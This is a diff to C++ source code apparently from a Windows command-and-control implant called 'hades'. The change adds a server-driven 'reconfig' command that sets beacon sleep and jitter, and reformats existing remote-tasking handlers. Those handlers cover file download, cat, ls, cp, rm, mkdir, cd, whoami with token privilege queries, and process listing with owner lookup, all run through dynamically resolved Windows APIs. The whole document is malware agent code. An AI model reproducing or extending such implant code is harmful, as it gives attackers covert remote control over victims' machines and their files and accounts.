@@ -1,4 +1,5 @@
 #include "cmds.hpp"
+#include "../hades/config.hpp"
 #include <stdio.h>
 
 
@@ -68,6 +69,8 @@ BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
 		case CMD_CODE_DOWNLOAD:
 			do_download();
 			break;
+		case CMD_CODE_RECONFIG:
+			do_reconfig();
 		default:
 			break;
 		}
@@ -78,6 +81,24 @@ BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
 }
 
 
+void commanders::do_reconfig() {
+
+	g_ByteMgr->BeginTask();
+
+
+	// messed up early with DB schema
+	// to lazy to fix server side so for now just convert from str to int, ill fix later(probably never)
+	UINT SleepLen = g_ByteMgr->Read4();
+	PCHAR s = g_ByteMgr->ReadString(SleepLen);
+	UINT JitterLen = g_ByteMgr->Read4();
+	PCHAR j = g_ByteMgr->ReadString(JitterLen);
+
+
+	hades->config->Sleep = IntFromStr(s);
+	hades->config->Jitter = IntFromStr(j);
+
+	g_ByteMgr->EndOk(RECONFIG_DONE);
+}
 void commanders::do_download() {
 	HANDLE hFie = NULL;
 	PCHAR Path = NULL;
@@ -198,20 +219,20 @@ CLEANUP:
 
 void commanders::do_whoami() {
 	PTOKEN_PRIVILEGES TokenPrivs = NULL;
-	PCHAR buf                    = NULL;
-	HANDLE hToken                = NULL;
-	PTOKEN_USER TokenUsr         = NULL;
-	LPSTR SidStr				 = NULL;
+	PCHAR buf = NULL;
+	HANDLE hToken = NULL;
+	PTOKEN_USER TokenUsr = NULL;
+	LPSTR SidStr = NULL;
 	SID_NAME_USE sidType;
 	NTSTATUS Stat;
 
-	CHAR NameBuf[256]   = { 0 };
+	CHAR NameBuf[256] = { 0 };
 	CHAR DomainBuf[256] = { 0 };
-	DWORD NameLen       = 256;
-	DWORD DomainLen     = 256;
-	DWORD TokenUsrSize  = 0;
+	DWORD NameLen = 256;
+	DWORD DomainLen = 256;
+	DWORD TokenUsrSize = 0;
 	DWORD TokenPrivSize = 0;
-	DWORD SidLen		= 0;
+	DWORD SidLen = 0;
 
 
 
@@ -301,13 +322,13 @@ CLEANUP:
 
 
 void commanders::do_cat() {
-	BOOL Result     = FALSE;
-	HANDLE hFile    = NULL;
-	PBYTE buf       = NULL;
+	BOOL Result = FALSE;
+	HANDLE hFile = NULL;
+	PBYTE buf = NULL;
 	DWORD ChunkSize = 2048;
 	DWORD BytesRead = 0;
-	
-	
+
+
 	g_ByteMgr->BeginTask();
 
 	UINT FileLen = g_ByteMgr->Read4();
@@ -331,8 +352,8 @@ void commanders::do_cat() {
 
 CLEANUP:
 	if (FileName) { g_ByteMgr->FreeString(FileName); }
-	if (buf)      { HeapFree(GetProcessHeap(), 0, buf); }
-	if (hFile)    { hades->WinApis.CloseHandle(hFile); }
+	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
+	if (hFile) { hades->WinApis.CloseHandle(hFile); }
 	return;
 
 
@@ -345,13 +366,13 @@ CLEANUP:
 void commanders::do_ls() {
 	WIN32_FIND_DATAA FindData;
 	HANDLE hFind = NULL;
-	
+
 	DWORD typeLen;
-	DWORD BufSize   = 12 * 1024;
+	DWORD BufSize = 12 * 1024;
 	DWORD TotalSize = 0;
-	DWORD Namelen   = 0;
-	DWORD EntryLen  = 0;
-	DWORD PathSize  = 0;
+	DWORD Namelen = 0;
+	DWORD EntryLen = 0;
+	DWORD PathSize = 0;
 
 	char path[MAX_PATH];
 	const char* type;
@@ -361,7 +382,7 @@ void commanders::do_ls() {
 	PCHAR Dir = g_ByteMgr->ReadString(len);
 
 
-	
+
 	PathSize = hades->WinApis.GetFullPathNameA(Dir, MAX_PATH, path, NULL);
 	DWORD attrs = hades->WinApis.GetFileAttributesA(Dir);
 	BOOL file = (attrs != INVALID_FILE_ATTRIBUTES) && !(attrs & FILE_ATTRIBUTE_DIRECTORY);
@@ -370,7 +391,7 @@ void commanders::do_ls() {
 		path[++PathSize] = '*';
 		path[++PathSize] = '\0';
 	}
-	
+
 
 	hFind = hades->WinApis.FindFirstFileA(path, &FindData);
 	if (!hFind || hFind == INVALID_HANDLE_VALUE) {
@@ -416,9 +437,9 @@ void commanders::do_cp() {
 	g_ByteMgr->BeginTask();
 
 	UINT srcLen = g_ByteMgr->Read4();
-	PCHAR src   = g_ByteMgr->ReadString(srcLen);
+	PCHAR src = g_ByteMgr->ReadString(srcLen);
 	UINT dstLen = g_ByteMgr->Read4();
-	PCHAR dst   = g_ByteMgr->ReadString(dstLen);
+	PCHAR dst = g_ByteMgr->ReadString(dstLen);
 
 	BOOL Result = hades->WinApis.CopyFileA(src, dst, FALSE);
 	if (!Result) {
@@ -437,7 +458,7 @@ CLEANUP:
 void commanders::do_rmdir() {
 	g_ByteMgr->BeginTask();
 
-	UINT DirLen   = g_ByteMgr->Read4();
+	UINT DirLen = g_ByteMgr->Read4();
 	PCHAR DirName = g_ByteMgr->ReadString(DirLen);
 
 	if (!hades->WinApis.RemoveDirectoryA(DirName)) {
@@ -454,7 +475,7 @@ CLEANUP:
 
 void commanders::do_mkdir() {
 	g_ByteMgr->BeginTask();
-	
+
 	DWORD Len = g_ByteMgr->Read4();
 	PCHAR Name = g_ByteMgr->ReadString(Len);
 
@@ -471,7 +492,7 @@ CLEANUP:
 void commanders::do_rm() {
 	g_ByteMgr->BeginTask();
 
-	UINT NameLen   = g_ByteMgr->Read4();
+	UINT NameLen = g_ByteMgr->Read4();
 	PCHAR FileName = g_ByteMgr->ReadString(NameLen);
 
 	if (!hades->WinApis.DeleteFileA(FileName)) {
@@ -489,7 +510,7 @@ void commanders::do_cd() {
 	g_ByteMgr->BeginTask();
 
 	UINT DirLen = g_ByteMgr->Read4();
-	PCHAR dir   = g_ByteMgr->ReadString(DirLen);
+	PCHAR dir = g_ByteMgr->ReadString(DirLen);
 	if (!hades->WinApis.SetCurrentDirectoryA(dir)) {
 		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
 		goto CLEANUP;
@@ -515,7 +536,7 @@ void commanders::do_pwd() {
 
 	Res = hades->WinApis.GetCurrentDirectoryA(size, buf);
 	if (Res == 0 || Res >= size) {
-	
+
 		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
 		goto CLEANUP;
 	}
@@ -567,7 +588,7 @@ void commanders::do_ps() {
 	DWORD NameLen = 256;
 	DWORD DomainLen = 256;
 
-	PBYTE buf    = NULL;
+	PBYTE buf = NULL;
 	DWORD needed = 0;
 	DWORD PID = 0;
 	INT len = 0;
@@ -584,7 +605,7 @@ void commanders::do_ps() {
 		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
 		goto CLEANUP;
 	}
-	
+
 	stat = hades->NtApis.NtQuerySystemInformation(SystemProcessInformation, buf, size, &size);
 	if (!NTAPI_SUCCESS(stat)) {
 		g_ByteMgr->EndErr(ERROR_PS_LIST);
@@ -602,7 +623,7 @@ void commanders::do_ps() {
 		DWORD ownerLen = 3;
 		if (!spi->ImageName.Buffer) {
 			goto NEXT_ENTRY;
-		} 
+		}
 		len = WideCharToMultiByte(CP_UTF8, 0, spi->ImageName.Buffer, spi->ImageName.Length / sizeof(WCHAR), line, sizeof(line) - 32, NULL, NULL);
 		PID = (DWORD)(ULONG_PTR)spi->UniqueProcessId;
 
@@ -624,7 +645,7 @@ void commanders::do_ps() {
 					if (hades->WinApis.LookupAccountSidA(NULL, tokenUsr->User.Sid, NameBuf, &NameLen, DomainBuf, &DomainLen, &sidType)) {
 						owner = NameBuf;
 						ownerLen = NameLen;
-						
+
 					}
 				}
 				HeapFree(GetProcessHeap(), 0, tokenUsr);
@@ -639,7 +660,7 @@ void commanders::do_ps() {
 		g_ByteMgr->Write4(ownerLen);
 		g_ByteMgr->WriteString((PBYTE)owner, ownerLen);
 		g_ByteMgr->Write4(PID);
-		
+
 
 	NEXT_ENTRY:
 		if (spi->NextEntryOffset == NULL) break;
